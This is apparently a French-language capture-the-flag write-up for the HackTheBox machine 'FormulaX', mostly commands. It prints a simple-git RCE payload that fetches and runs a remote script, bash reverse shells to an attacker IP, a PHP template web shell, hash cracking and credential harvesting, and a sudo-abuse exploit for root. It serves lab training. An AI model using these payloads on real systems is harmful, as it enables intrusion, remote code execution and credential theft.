  # FormulaX

	echo "10.10.11.6 formulax.htb" >> /etc/hosts
	sudo masscan -p1-65535,U:1-65535 10.10.11.6 -e tun0 > ports.txt
	sudo nmap -p- -sV -T4 -A 10.10.11.6 -oN nmap.txt
	feroxbuster --silent -u http://formulax.htb
	
Scans classiques.

    PORT   STATE SERVICE VERSION
    22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.6 (Ubuntu Linux; protocol 2.0)
    80/tcp open  http    nginx 1.18.0 (Ubuntu)


Après inscription, on arrive sur un chat avec un bot.

Fuzzing => Page **/restricted/contact_us.html** => XSS => Découverte du domaine **dev-git-auto-update.chatbot.htb**

Une RCE existe pour simple-git < 3.15 : https://security.snyk.io/vuln/SNYK-JS-SIMPLEGIT-3112221

Entrer une URL dans le formulaire qu'il y a sur ce domaine, intercepter avec Burp et mettre notre IP avec un script à la place en utilisant le PoC du dessus : 

    ext::sh -c curl% http://10.10.16.108:8000/rev.sh|bash

Script à héberger : 

    #!/bin/bash
    bash -c "bash -i >& /dev/tcp/10.10.16.108/9999 0>&1"		 



## Pivoting 

    mongo --shell
    
    show dbs
    use testing
    show collections
    db.users.find()
    ...
    hashcat -m 3200 hash /usr/share/wordlists/rockyou.txt
    
    ssh frank_dorky@10.10.11.6 
    
    cat user.txt



## Élévation de privilèges

Site web interne.

    /opt/librenms/adduser.php tim tim 10
    ...
    ssh -L 3000:127.0.0.1:3000 frank_dorky@10.10.11.6
    
Aller sur http://127.0.0.1:3000 et se connecter en tant que "tim" / "tim"

    echo "127.0.0.1 librenms.com" >> /etc/hosts

Dans **/templates**, ajouter le shell PHP suivant : 

    @php
    system("bash -c '/bin/bash -i >& /dev/tcp/10.10.16.108/9999 0>&1'");
    @endphp    

On reçoit un shell en tant que "librenms" et il y a un fichier contenant d'autres credentials : 

    cat .custom.env
    ssh kai_relay@10.10.11.6
    
    sudo -l
    
    
>(ALL) NOPASSWD: /usr/bin/office.sh

<br>

Voir : https://www.exploit-db.com/exploits/46544


    nano /tmp/shell.sh
    chmod +x /tmp/shell.sh
    
    sudo /usr/bin/office.sh 
    
    python3 exp.py --host 127.0.0.1 --port 2002

	cat /root/root.txt
